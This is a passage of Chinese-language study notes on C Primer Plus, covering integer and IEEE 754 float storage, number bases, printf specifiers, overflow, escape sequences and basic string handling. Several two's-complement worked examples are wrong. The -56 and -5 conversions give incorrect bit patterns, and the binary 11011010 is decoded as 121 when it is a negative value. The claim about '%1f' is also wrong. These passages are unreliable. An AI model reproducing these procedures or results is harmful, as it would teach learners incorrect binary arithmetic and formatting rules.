title="整数的储存"></a>整数的储存</h3><p>整数类型通常以<strong>二进制补码</strong>形式存储在内存中。补码表示法用于表示正数、负数和零。</p><p><strong>以转化-56为例：</strong></p><ol><li><p><strong>确定绝对值的二进制表示：</strong>将负数的绝对值转换为正数的二进制表示。</p><p>​        首先，找出-56的绝对值，即56，并将其转换为二进制。56的二进制表示为111000。</p></li><li><p><strong>取反：</strong>将这个正数的二进制表示中的每个位都取反，即0变为1，1变为0。</p><p>​       现在，将上一步得到的二进制表示中的每一位取反，0变为1，1变为0，得到000111。</p></li><li><p><strong>加1：</strong>接下来，在取反后的二进制数上加1。</p><p>​       接下来，在取反后的结果上加1。000111 + 1 &#x3D; 001000。</p></li><li><p><strong>添加符号位：</strong>符号位是二进制表示中的一个特殊位，用于表示一个数的正负。在有符号整数表示法中，符号位通常是最高位（最左边的位），用来表示整数的正负性。</p><p>在得到的结果前面添加符号位，因为原数是负数，所以最高位为1。最终的补码表示为1001000&#96;。</p></li></ol><p><strong>整数的最大最小值</strong></p><ul><li>C 标准对基本数据类型只规定了允许的最小大小。</li><li>对于 16 位机，short 和 int 的最小取值范围是[−32767,32767]；对于32位机，long的最小取值范围是[−2147483647,2147483647]。对于unsigned short和unsigned int，最小取值范围是[0,65535]；对于unsigned long，最小取值范围是[0,4294967295]。long long类型是为了支持64 位的需求， 最小取值范围是[−9223372036854775807,9223372036854775807]；unsigned long long 的最小取值范围是[0,18446744073709551615]</li></ul><h3 id="浮点数的储存"><a href="#浮点数的储存" class="headerlink" title="浮点数的储存"></a>浮点数的储存</h3><p>以IEEE 754标准，32位可以用于表示大约7个有效数字的浮点数，64位可以用于表示大约15到17位的有效数字。</p><p>以<strong>单精度浮点数（32位）</strong>为例：</p><p>​        遵循IEEE 754标准，这个标准定义了浮点数的二进制表示方式以及进行浮点数运算的规则。</p><ul><li>1位用于表示符号位（正负号），0表示正数，1表示负数。</li><li>8位用于表示指数部分（exponent）。</li><li>剩下的23位用于表示尾数部分（mantissa）。</li></ul><p><strong>以转化42.625为例</strong></p><ol><li><p><strong>将整数部分转换为二进制</strong>：</p><p>将整数部分42转换为二进制，得到<code>101010</code>。</p></li><li><p><strong>将小数部分转换为二进制</strong>：</p><p>将小数部分0.625转换为二进制。通常，可以将小数部分乘以2并取整数部分，然后将余数作为下一位的小数部分，一直重复直到小数部分为0或者达到所需的精度。对于0.625，这个过程如下：</p><ul><li>0.625 * 2 &#x3D; 1.25，整数部分是1，小数部分更新为0.25。</li><li>0.25 * 2 &#x3D; 0.5，整数部分是0，小数部分更新为0.5。</li><li>0.5 * 2 &#x3D; 1.0，整数部分是1，小数部分更新为0.0。</li></ul><p>因此，0.625的二进制表示为<code>0.101</code>。</p></li><li><p><strong>将整数部分和小数部分组合</strong>：</p><p>将整数部分<code>101010</code>和小数部分<code>0.101</code>组合在一起，得到二进制表示<code>101010.101</code>。</p></li><li><p><strong>规范化</strong>：</p><p>在IEEE 754中，浮点数采用科学计数法表示，其中二进制小数点位于左边的第一个非零位前面。因此，需要将二进制数规范化，将小数点移到合适的位置。在这种情况下，将小数点移到最左边，得到规范化的二进制表示为<code>1.01010101 x 2^5</code>。</p></li><li><p><strong>确定指数和尾数</strong>：</p><ul><li>指数：因为小数点向左移了5位，所以指数为5。在IEEE 754中，还需要加上一个偏移值（127），因此指数为5 + 127 &#x3D; 132。以8位表示指数，二进制为<code>10000100</code>。</li><li>尾数：小数点左边的部分是尾数，即<code>01010101</code>。</li></ul></li><li><p><strong>组合符号、指数和尾数</strong>：</p><ul><li>符号位：因为42.625是正数，所以符号位为0。</li><li>指数：上面计算得到的8位指数为<code>10000100</code>。</li><li>尾数：上面计算得到的尾数为<code>01010101</code>。</li></ul></li></ol><p>最终，将这些组合在一起得到32位的浮点数表示为：<code>0 10000100 01010101000000000000000</code></p><p>这就是42.625的单精度浮点数表示，其中第一个位是符号位，接下来的8位是指数，剩下的23位是尾数。这个二进制表示可以转换为十进制浮点数为42.625。</p><p><strong>注：</strong></p><p><strong>偏移值的作用：使次方数换算为二进制时不出现小数点</strong></p><p><strong>偏移值的确定即确定最小次方数：</strong>（以32位为例）</p><p>​        32位精度有8位二进制用来表示次方数，故次方的范围数位(2**8 -1)即255。0占去1位，剩下正负进行平分，故最小的次方数位-127，故偏移值为127，加上偏移值后次方数不存在负数的情况</p><p><strong>因使用过二进制的科学计数法，小数点前一定为1，故尾数部分只取小数点后的一部分</strong></p><h2 id="进制"><a href="#进制" class="headerlink" title="进制"></a>进制</h2><h3 id="进制书面表示"><a href="#进制书面表示" class="headerlink" title="进制书面表示"></a><strong>进制书面表示</strong></h3><ul><li>1011B表示二进制1011，也记作（1011）2</li><li>1357O(字母O)表示八进制1357，也记为（1357）8</li><li>2049D表示为十进制2049，也记作（2049）10</li><li>3FB9H表示十六进制数3FB9，也记作（3FB9）16</li></ul><h3 id="初始化变量时的进制表示"><a href="#初始化变量时的进制表示" class="headerlink" title="初始化变量时的进制表示"></a>初始化变量时的进制表示</h3><ul><li>加<code>0b</code>或者<code>0B</code>表示二进制</li><li>加<code>0</code>表示八进制</li><li>加<code>0x</code>或<code>0X</code>表示16进制</li><li>不加默认表示10进制</li></ul><p>可在<strong>整数</strong>输入的数值后添加<code>L/l</code>表示此整数以32位进制运算，如</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">7L</span></span><br></pre></td></tr></table></figure><p>可在浮点数后输入f表示此浮点数以32位float进行运算（默认为64位double进行运算），以便提高运算效率，如</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">float</span> a = <span class="number">7.0f</span></span><br></pre></td></tr></table></figure><h3 id="输出中的进制表示"><a href="#输出中的进制表示" class="headerlink" title="输出中的进制表示"></a>输出中的进制表示</h3><ul><li><code>%d/%i</code>表示有符号十进制输出</li><li><code>%x</code>或<code>%X</code>表示以十六进制输出</li><li><code>%o</code>表示以八进制输出</li><li><code>%f</code>表示输出单精度浮点数</li><li><code>%ld</code>表示输出长整型十进制整数</li><li><code>%lo</code>表示输出长整型八进制整数</li><li><code>%lx</code>表示输出长整型十六进制整数</li><li><code>%lf</code>表示输出双精度浮点数</li><li><code>%c</code>格式对应的是单个字符</li><li><code>%s</code>格式对应的是字符串</li><li><code>%hd</code>表示输出short类型的十进制整数</li><li><code>%ho</code>表示输出short类型的八进制整数</li><li><code>%hx</code>表示输出short类型的十六进制整数</li><li><code>%lld</code>表示输出<code>long long int</code>整数</li><li><code>%llx</code>表示输出<code>long long int</code>十六进制整数</li><li><code>%llo</code>表示输出<code>long long int</code>八进制整数</li><li><code>%llu</code>表示输出<code>long long unsigned</code>整数</li><li><code>%u</code>表示输出无符号整数</li><li><code>%e/%E</code>表示输出以指数计数法的浮点数</li><li><code>%le/%E</code>表示输出以指数计数法的长浮点数</li><li><code>%a/%A</code>表示输出以十六进制指数计数法的浮点数</li><li><code>%%</code>表示输出百分号</li><li><code>%p</code>（在不支持<code>%p</code>的编译器中<code>%u</code> 或<code>%lu</code> 代替<code>%p</code>）表示指针</li><li><code>%g/%G</code>自动选择以<code>%f</code>或<code>%e</code>输出</li><li><code>%zd</code>作为函数<code>sizeof()</code>的输出</li></ul><p><strong>注：</strong></p><ul><li><p><code>unsigned</code> 修饰符不能用于浮点数类型。它只能用于整数数据类型</p></li><li><p>默认八进制和十六进制都是整数类型数值</p></li><li><p>输出时，如果要在八进制和十六进制值前显示<code>0</code>和<code>0x</code>前缀，要分别在转换说明中加入#（即在%后加入#）</p></li><li><p><code>%1f</code>表示输出浮点数并保留小数点后一位</p></li><li><p><code>%1.2f</code>表示输出浮点数且小数点前至少一字节（不足空格补足）并保留两位小数</p></li><li><p><code>%d</code>可用于输出<code>char</code>类型的变量，但不能用于<code>scanf()</code>赋值</p></li></ul><h3 id="进制的转化（1）–负数"><a href="#进制的转化（1）–负数" class="headerlink" title="进制的转化（1）–负数"></a>进制的转化（1）–负数</h3><h4 id="十进制转二进制（十进制为负数）"><a href="#十进制转二进制（十进制为负数）" class="headerlink" title="十进制转二进制（十进制为负数）"></a>十进制转二进制（十进制为负数）</h4><p>当将负数从十进制转换为二进制时，通常会使用二进制补码表示法。这是因为在计算机内部，负数通常以二进制补码的形式存储。下面是将负数转换为二进制的一般过程：</p><ol><li><p><strong>确定负数的绝对值</strong>：首先，确定负数的绝对值。例如，如果要将-5转换为二进制，绝对值是5。</p></li><li><p><strong>将绝对值转换为二进制</strong>：将绝对值转换为二进制的标准方法是使用除2取余法（或称为短除法）：</p><ul><li>不断将绝对值除以2，同时记录每一步的余数。</li><li>将余数以逆序的方式排列，就得到了二进制表示。例如，对于绝对值5，过程如下：<ul><li>5 ÷ 2 &#x3D; 2 余 1</li><li>2 ÷ 2 &#x3D; 1 余 0</li><li>1 ÷ 2 &#x3D; 0 余 1</li></ul></li><li>然后，将这些余数逆序排列，得到二进制数101。</li></ul></li><li><p><strong>将二进制数取反</strong>：在二进制补码中，正数的补码和原码相同，但负数的补码需要将其绝对值的二进制数取反，即0变为1，1变为0。在上面的例子中，二进制数101取反后变为010。</p></li><li><p><strong>将取反后的结果加1</strong>：最后一步是将取反后的结果加1。在上面的例子中，010 + 1 &#x3D; 011。</p></li><li><p><strong>加上符号位</strong>：最终，加上符号位。在二进制补码中，符号位是最左边的位，0表示正数，1表示负数。在上面的例子中，要表示-5，将最左边的位设置为1，得到最终结果1101。</p></li></ol><p>所以，将负数-5转换为二进制补码的结果是1101。这个过程可以用于将任何负数转换为二进制补码。请注意，不同的编程语言可能有不同的方式来表示二进制补码，但这个过程是通用的。</p><h4 id="二进制转十进制（符号位为1）"><a href="#二进制转十进制（符号位为1）" class="headerlink" title="二进制转十进制（符号位为1）"></a>二进制转十进制（符号位为1）</h4><ol><li><p><strong>找到符号位</strong>：首先，从二进制表示中找到符号位。在二进制补码中，符号位是最左边的位，1表示负数，0表示正数。</p></li><li><p><strong>取反</strong>：将除符号位以外的所有位取反，即0变为1，1变为0。这是为了得到负数的绝对值的二进制表示。</p></li><li><p><strong>加1</strong>：对取反后的结果加1，以得到负数的绝对值的二进制补码表示。</p></li><li><p><strong>计算绝对值的十进制</strong>：将上一步得到的二进制数转换为十进制。这是标准的二进制到十进制转换。从最右边的位（最低位）开始，将每个位的值乘以2的幂，然后相加，直到处理完所有位。</p></li><li><p><strong>加上负号</strong>：根据最初的符号位，将正数的绝对值前面添加负号。</p></li></ol><p>让我们以一个例子来说明这个过程。假设我们有一个8位的二进制补码：11011010。</p><ol><li>找到符号位：符号位是最左边的位，1表示负数。</li><li>取反：去除符号位并将其余位取反，得到00100110。</li><li>加1：对取反后的结果加1，得到00100111。</li><li>计算绝对值的十进制：将00100111转换为十进制。从右到左，第1位是1，第2位是2，第3位是4，第4位是0，第5位是0，第6位是0，第7位是0，第8位是-128（因为符号位是1）。计算总和：1 + 2 + 4 + 0 + 0 + 0 + 0 + (-128) &#x3D; -121。</li><li>加上负号：最初的符号位是1，所以最终结果是-(-121)，即121。</li></ol><p>因此，二进制补码11011010对应的十进制值是121。这个过程可以用于将任何负数的二进制补码表示转换为十进制。</p><h3 id="进制的转换（2）-正数"><a href="#进制的转换（2）-正数" class="headerlink" title="进制的转换（2）-正数"></a>进制的转换（2）-正数</h3><p>​     正数的转化无需像负数-取反、加一，直接将除符号位的二进制转化为十进制即可</p><h2 id="数值溢出"><a href="#数值溢出" class="headerlink" title="数值溢出"></a>数值溢出</h2><h3 id="整数"><a href="#整数" class="headerlink" title="整数"></a>整数</h3><p>程序实例</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*（printf()函数使用%u说明显示unsigned int类型的值）。*/</span></span><br><span class="line"><span class="comment">/* toobig.c-- 超出系统允许的最大int值*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i = <span class="number">-2147483648</span>;</span><br><span class="line"><span class="type">int</span> k = <span class="number">2147483647</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> j = <span class="number">4294967295</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d %d %d\n&quot;</span>, i, i - <span class="number">1</span>, i - <span class="number">2</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d %d %d\n&quot;</span>, k, k + <span class="number">1</span>, k + <span class="number">2</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%u %u %u\n&quot;</span>, j, j + <span class="number">1</span>, j + <span class="number">2</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-2147483648 2147483647 2147483646</span><br><span class="line">2147483647 -2147483648 -2147483647</span><br><span class="line">4294967295 0 1</span><br></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>可以把无符号整数j看作是汽车的里程表。当达到它能表示的最大值时，会重新从起始点开始。整数 <code>i</code> 也是类似的情况。它们主要的区别是，在超过最大值时，<code>unsigned int 类型</code>的变量 <code>j</code> 从 0开始；而<code>int类型</code>的变量i则从−2147483648（从绝对值最大）开始。</p><h3 id="浮点值的上溢和下溢"><a href="#浮点值的上溢和下溢" class="headerlink" title="浮点值的上溢和下溢"></a>浮点值的上溢和下溢</h3><p><strong>上溢：</strong></p><p>​      当计算导致数字过大，超过当前类型能表达的范围时，就会发生上溢。在这种情况下会给toobig赋一个表示<strong>无穷大的特定值</strong>，而且printf()显示该值为inf或infinity（或者具有无穷含义的其他内容）。</p><p><strong>下溢：</strong></p><p>​      当出现下溢的时候，计算机只好把尾数部分的位向右移，空出第 1 个二进制位，并丢弃最后一个二进制数。以十进制为例，把一个有4位有效数字的数（如，0.1234E-10）除以10，得到的结果是0.0123E-10。虽然得到了结果，但是在计算过程中却损失了原末尾有效位上的数字。</p><p>C语言把损失了类型全精度的浮点值称为低于正常的（subnormal）浮点值。。现在，C库已提供了用于检查计算是否会产生低于正常值的函数。</p><h2 id="字符"><a href="#字符" class="headerlink" title="字符"></a>字符</h2><p>char类型用于储存字符（如，字母或标点符号），但是从技术层面看，char是整数类型。</p><p>在C 语言中， 用单引号（<code>&#39; &#39;</code>）括起来的单个字符被称为字符常量。编译器一发现<code>&#39;A&#39;</code>，就会将其转换成相应的代码值。</p><h3 id="非打印字符"><a href="#非打印字符" class="headerlink" title="非打印字符"></a>非打印字符</h3><p>见<code>C Primer Plus 140-144</code></p><p>有些ASCII字符打印不出来。例如，一些代表行为的字符（如，退格、换行、终端响铃或蜂鸣）</p><p>以下有两种方法</p><p>方法一：使用ASCII码</p><p>例如，蜂鸣字符的ASCII值是7，因此可以这样写：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> beep = <span class="number">7</span></span><br></pre></td></tr></table></figure><p>方法二：使用转义符</p><p>转义序列赋给字符变量时，必须用单引号把转义序列括起来。<br>例如，假设有下面一行代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> nerf = <span class="string">&#x27;\n&#x27;</span>;</span><br></pre></td></tr></table></figure><table><thead><tr><th align="center"><strong>转义序列</strong></th><th align="center"><strong>含义</strong></th><th align="center"><strong>转移符号</strong></th><th align="center"><strong>含义</strong></th></tr></thead><tbody><tr><td align="center"><code>\a</code></td><td align="center">警报</td><td align="center"><code>\v</code></td><td align="center">垂直制表符</td></tr><tr><td align="center"><code>\b</code></td><td align="center">退格</td><td align="center"><code>\\</code></td><td align="center">反斜杠</td></tr><tr><td align="center"><code>\f</code></td><td align="center">换页</td><td align="center"><code>\&#39;</code></td><td align="center">单引号</td></tr><tr><td align="center"><code>\n</code></td><td align="center">换行</td><td align="center"><code>\&quot;</code></td><td align="center">双引号</td></tr><tr><td align="center"><code>\r</code></td><td align="center">回车</td><td align="center"><code>\?</code></td><td align="center">问号</td></tr><tr><td align="center"><code>\t</code></td><td align="center">水平制表符</td><td align="center"><code>\xhhh</code></td><td align="center">十六进制值 (<code>hhh</code> 是1～3位十六进制数字，即每个h可表示 0~f中的一个数，)</td></tr><tr><td align="center"><code>\000</code></td><td align="center">八进制值 (oo 必须是有效的八进制数，即每个o可表示 0~7中的一个数，可<strong>省略数字前多余的0</strong>默认也为8进制，但为了防止出问题建议补全为3位)</td><td align="center"><code>\+任意符号</code></td><td align="center">输出对应符号</td></tr></tbody></table><p>对于<code>\0oo</code>和<code>\xhh</code>，等同于使用ASCII的十进制对应数据效果</p><p>何时使用ASCII码？何时使用转义序列？如果要在转义序列（假设使用<code>&#39;\f&#39;</code>）和ASCII码（’<code>\014</code>‘）之间选择，请选择前者（即’<code>\f</code>‘）。这样的写法不仅更好记，而且可移植性更高。’\f’在不使用ASCII码的系统中，仍然有效。</p><h2 id="本章注意点：-1"><a href="#本章注意点：-1" class="headerlink" title="本章注意点："></a>本章注意点：</h2><hr><h3 id="变量初始化"><a href="#变量初始化" class="headerlink" title="变量初始化"></a>变量初始化</h3><p>需要每个值进行初始化，否则会造成错误</p><h3 id="getchar-函数的使用"><a href="#getchar-函数的使用" class="headerlink" title="getchar()函数的使用"></a><code>getchar()</code>函数的使用</h3><p>实例</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* platinum.c -- your weight in platinum */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">float</span> weight; <span class="comment">/* 你的体重 */</span></span><br><span class="line"><span class="type">float</span> value; <span class="comment">/* 相等重量的白金价值 */</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Are you worth your weight in platinum?\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s check it out.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Please enter your weight in pounds: &quot;</span>);</span><br><span class="line"><span class="comment">/* 获取用户的输入 */</span></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%f&quot;</span>, &amp;weight);</span><br><span class="line"><span class="comment">/* 假设白金的价格是每盎司$1700 */</span></span><br><span class="line"><span class="comment">/* 14.5833用于把英镑常衡盎司转换为金衡盎司[1]*/</span></span><br><span class="line">value = <span class="number">1700.0</span> * weight * <span class="number">14.5833</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Your weight in platinum is worth $%.2f.\n&quot;</span>, value);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;You are easily worth that! If platinum prices drop,\n&quot;</span>); </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;eat more to maintain your value.\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序的输出在<strong>屏幕上一闪而过</strong>，此时可使用，在程序中添加下面一行代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getchar();</span><br></pre></td></tr></table></figure><p>但程序的输出依旧在<strong>屏幕上一闪而过</strong>，本例，需要调用两次<code>getchar()</code>函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getchar();</span><br><span class="line">getchar();</span><br></pre></td></tr></table></figure><p><strong>分析</strong>：</p><p>​        在这种情况下，键入 <code>156</code> 并按下<code>Enter</code>键（发送一个换行符），然后<code>scanf()</code>读取键入的数字，第1个<code>getchar()</code>读取换行符，第2个<code>getchar()</code>让程序暂停，等待输入。</p><p><strong>原因：</strong></p><p>​        在你输入自己的数值后按下回车，<code>scanf</code>函数读取用户输入的体重值时，回车键会被当作输入的一部分，并被存储在输入缓冲区中。<code>scanf</code>函数会读取用户输入的数值，但回车键仍然留在缓冲区中，并且<code>getchar()</code>函数会获取回车键字符。</p><h3 id="声明变量的作用"><a href="#声明变量的作用" class="headerlink" title="声明变量的作用"></a>声明变量的作用</h3><p>​       声明为变量创建和标记存储空间</p><h3 id="数据类型应与打印类型一致"><a href="#数据类型应与打印类型一致" class="headerlink" title="数据类型应与打印类型一致"></a>数据类型应与打印类型一致</h3><p>实例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* print2.c--更多printf()的特性 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> un = <span class="number">3000000000</span>; <span class="comment">/* int为32位和short为16</span></span><br><span class="line"><span class="comment">位的系统 */</span></span><br><span class="line"><span class="type">short</span> end = <span class="number">200</span>;</span><br><span class="line"><span class="type">long</span> big = <span class="number">65537</span>;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> verybig = <span class="number">12345678908642</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;un = %u and not %d\n&quot;</span>, un, un);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;end = %hd and %d\n&quot;</span>, end, end);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;big = %ld and not %hd\n&quot;</span>, big, big);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;verybig= %lld and not %ld\n&quot;</span>, verybig, verybig);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">un = 3000000000 and not -1294967296</span><br><span class="line">end = 200 and 200</span><br><span class="line">big = 65537 and not 1</span><br><span class="line">verybig= 12345678908642 and not 1942899938</span><br></pre></td></tr></table></figure><p>该例表明，<strong>使用错误的转换说明</strong>会得到意想不到的结果。</p><p>原因：</p><p>情况一：例如第一行输出</p><p><strong>内存中的数位相同：不同数据类型中不同的位数所表示含义不一样，造成输出错误</strong>，也如：long long int 和double这两个数据类型</p><p>情况二：例如第三、四行输出</p><p><strong>不同的修饰符可以截断成不同类型值，printf（）从二进制的后往前读取位数</strong></p><p>把 65537 以二进制格式写成一个 32 位数是<code>00000000000000010000000000000001</code>。使用%hd， printf()只会查看后 16 位，所以显示的值是 1。与此类似，输出的最后一行先显示了verybig的完整值，然后由于使用了%ld，printf()只显示了储存在后32位的值。</p><p><strong>注意：</strong></p><p><strong>在使用 printf()函数时，切记检查每个待打印值都有对应的转换说明，还要检查转换说明的类型是否与待打印值的类型相匹配。</strong></p><h3 id="断行输入"><a href="#断行输入" class="headerlink" title="断行输入"></a>断行输入</h3><p>​    只要不在引号内部或一个单词中间断行，就可以被分为两行</p><h3 id="sizeof-函数"><a href="#sizeof-函数" class="headerlink" title="sizeof()函数"></a><code>sizeof()</code>函数</h3><p>sizeof是C语言的内置运算符，以字节为单位给出指定类型的大小。C99和C11提供%zd转换说明匹配sizeof的返回类型。一些不<br>支持C99和C11的编译器可用%u或%lu代替%zd。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Type int has a size of %zd bytes.\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;type int has a size of %u bytes.\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;type int has a size of %lu bytes.\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br></pre></td></tr></table></figure><h3 id="输入的数据类型与设定数据类型不一致的情况"><a href="#输入的数据类型与设定数据类型不一致的情况" class="headerlink" title="输入的数据类型与设定数据类型不一致的情况"></a>输入的数据类型与设定数据类型不一致的情况</h3><p>把一个类型的数值初始化给不同类型的变量时，编译器会把值转换成与变量匹配的类型，这将导致部分数据丢失。</p><p>例如</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> cost = <span class="number">12.99</span>; <span class="comment">/* 用double类型的值初始化int类型的变量 */</span></span><br><span class="line"><span class="type">float</span> pi = <span class="number">3.1415926536</span>; <span class="comment">/* 用double类型的值初始化float类型的变量 */</span></span><br></pre></td></tr></table></figure><p>第1个声明，cost的值是12。C编译器把浮点数转换成整数时，会直接丢弃（截断）小数部分，而不进行四舍五入。第2个声明会损失一些精度，因为C只保证了float类型前6位的精度。</p><hr><h1 id="字符串和格式化"><a href="#字符串和格式化" class="headerlink" title="字符串和格式化"></a><strong>字符串和格式化</strong></h1><h2 id="字符串与char数组"><a href="#字符串与char数组" class="headerlink" title="字符串与char数组"></a>字符串与<code>char</code>数组</h2><p><strong>字符串</strong>（character string）是一个或多个字符的序列，双引号不是字符串的一部分。双引号仅告知编译器它括起来的是字符串，正如单引号用于标识单个字符一样。</p><p>C语言没有专门用于储存字符串的变量类型，字符串都被储存在char类型的数组（数组是同类型数据元素的有序序列）中。数组由连续的存储单元组成，字符串中的字符被储存在相邻的存储单元中</p><p>数组末尾位置的字符<code>\0</code> 。这是空字符（ null character），C语言用它标记字符串的结束。空字符不是数字0，它是非打印字符。C中的字符串一定以空字符结束，这意味着<strong>数组的容量必须至少比待存储字符串中的字符数多1</strong>。</p><h2 id="常量和C预处理器"><a href="#常量和C预处理器" class="headerlink" title="常量和C预处理器"></a>常量和C预处理器</h2><p>假设程序中的多处使用一个常量，有时需要改变它的值。毕竟，税率通常是浮动的。如果程序使用符号常量，则只需更改符号。常量的定义，不用在程序中查找使用常量的地方，然后逐一修改。C语言还提供了一个更好的方案——<strong>C预处理器</strong>。只需在程序顶部添加下面一行：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> TAXRATE 0.015</span></span><br></pre></td></tr></table></figure><p>用大写表示符号常量是 C 语言一贯的传统。这样，在程序中看到全大写的名称就立刻明白这是一个符号常量，而非变量。</p><p>C头文件<code>limits.h</code>和<code>float.h</code>分别提供了与整数类型和浮点类型大小限制相关的详细信息。</p><p>如果在程序中包含limits.h头文件，就可编写下面的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Maximum int value on this system = %d\n&quot;</span>,INT_MAX);</span><br></pre></td></tr></table></figure><p><code>limits.h</code>中的一些明示常量</p><p><img src="/./C-Primer-Plus_note/65a012741520d.jpg"></p><p><code>float.h</code>中的一些明示常量</p><p><img src="/./C-Primer-Plus_note/65a01277e389b.jpg"></p><h2 id="strlen-函数"><a href="#strlen-函数" class="headerlink" title="strlen()函数"></a><code>strlen()</code>函数</h2><p><code>strlen()</code>函数给出字符串中的字符长度</p><p>输出时可以使用<code>%zd</code>，在早期版本中换成<code>%u</code>或<code>%lu</code></p><h2 id="printf-的转化说明修饰符"><a href="#printf-的转化说明修饰符" class="headerlink" title="printf()的转化说明修饰符"></a>printf()的转化说明修饰符</h2><table><thead><tr><th>修饰符</th><th>含义</th></tr></thead><tbody><tr><td>标记</td><td>表4.5描述了5种标记(-、+、空格、#和0)，可以不使用标记或使用多个标记(不会对输出结果造成影响)<br />-表示输出时采用左对齐。 <br />+这表示要输出的整数值为正数时，要在其前面显示加号（+），而负数仍然会显示减号（-）<br />空格：有符号值若为正，则在值前面显示前导空格(不显示任何符号); 若为负，则在值前面显示减号+标记覆盖一个空格<br />#:把结果转换为另一种形式。如果是<code>%o</code> 